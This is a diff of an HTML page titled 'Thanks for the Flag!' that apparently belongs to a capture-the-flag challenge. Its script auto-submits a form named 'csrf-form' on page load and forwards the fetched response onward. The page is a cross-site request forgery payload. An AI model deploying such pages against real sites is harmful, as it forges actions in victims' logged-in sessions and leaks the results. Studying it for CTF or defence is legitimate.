@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <title>Thanks for the Flag!</title>
   <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const form = document.getElementById('csrf-form');
+    const onLoad = async function() {
+        const form = document.getElementById('csrf-form');
       
         const formData = new FormData(form);
         const response = await fetch(form.action, {
@@ -19,6 +19,9 @@
           body: response,
           });
       
+    }
+    document.addEventListener('DOMContentLoaded', function() {
+      onLoad();
     });
   </script>
 </head>
